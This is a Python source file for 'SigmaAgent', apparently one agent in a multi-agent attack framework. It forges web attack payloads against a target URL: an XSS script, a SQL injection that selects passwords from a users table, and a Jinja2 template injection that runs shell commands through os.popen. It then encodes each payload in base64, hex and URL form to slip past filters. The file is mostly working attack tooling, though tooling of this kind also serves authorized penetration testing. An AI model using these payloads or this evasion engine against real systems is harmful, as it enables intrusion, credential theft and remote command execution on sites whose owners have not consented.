import asyncio
import base64
import random
import urllib.parse
from backend.core.hive import BaseAgent, EventType, HiveEvent
from backend.core.protocol import JobPacket, ResultPacket, AgentID
from backend.ai.gi5 import GI5Engine
import json

class SigmaAgent(BaseAgent):
    """
    AGENT SIGMA: THE SMITH
    Role: Generative Weaponssmith.
    Capabilities:
    - Context-Aware Code Gen (Template Engine).
    - Obfuscation Engine (Base64, Hex, URL).
    """
    def __init__(self, bus):
        super().__init__("agent_sigma", bus)
        
        # SOTA: AI Generator 
        try:
            self.ai = GI5Engine()
        except:
             self.ai = None

        self.payload_templates = [
            "<script>alert('{context_var}')</script>",
            "UNION SELECT {context_table}, password FROM users--",
            "{{{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}}}"
        ]

    async def setup(self):
        # Listen for requests to generate payloads (e.g. from Beta)
        self.bus.subscribe(EventType.JOB_ASSIGNED, self.handle_generation_request)

    async def handle_generation_request(self, event: HiveEvent):
        # Sigma primarily serves other agents, but can execute "Gen-AI" jobs
        packet_dict = event.payload
        try:
             packet = JobPacket(**packet_dict)
        except: return

        if packet.config.agent_id != AgentID.SIGMA:
            return

        print(f"[{self.name}] Forging payloads for {packet.target.url}...")
        
        # 1. CONTEXT AWARE GENERATION
        generated_payloads = []
        
        # Try AI First
        if self.ai and self.ai.enabled:
             print(f"[{self.name}] >> Accessing Truth Kernel for Generative Payloads...")
             # GI5 returns a list of dicts: [ {"name": "...", "json": {...}} ]
             # We need to extract the raw strings or specialized JSON
             variants = self.ai.synthesize_payloads({"url": packet.target.url, "method": "GET"})
             for v in variants:
                  # Extract payload string if possible
                  p_str = json.dumps(v.get("json", {}))
                  generated_payloads.append(p_str)
        else:
             # Fallback to Templates
             context = {
                "context_var": "XSS_BY_SIGMA",
                "context_table": "admin_creds",
                "cmd": "id"
             }
             for template in self.payload_templates:
                raw_payload = template.format(**context)
                generated_payloads.append(raw_payload)
        
        # 2. OBFUSCATION ENGINE (Applies to all)
        final_payloads = []
        for raw in generated_payloads:
             final_payloads.append(raw)
             # Add variants
             final_payloads.append(self.obfuscate(raw, "base64"))
             final_payloads.append(self.obfuscate(raw, "hex"))
             final_payloads.append(self.obfuscate(raw, "url"))

        # Publish Results (The "Weapon Shipment")
        await self.bus.publish(HiveEvent(
            type=EventType.JOB_COMPLETED,
            source=self.name,
            payload={
                "job_id": packet.id,
                "status": "SUCCESS",
                "data": {"generated_payloads": final_payloads}
            }
        ))
        print(f"[{self.name}] Forged {len(final_payloads)} SOTA payloads.")

    def obfuscate(self, payload: str, method: str) -> str:
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "hex":
            return "".join([hex(ord(c)) for c in payload])
        elif method == "url":
            return urllib.parse.quote(payload)
        return payload
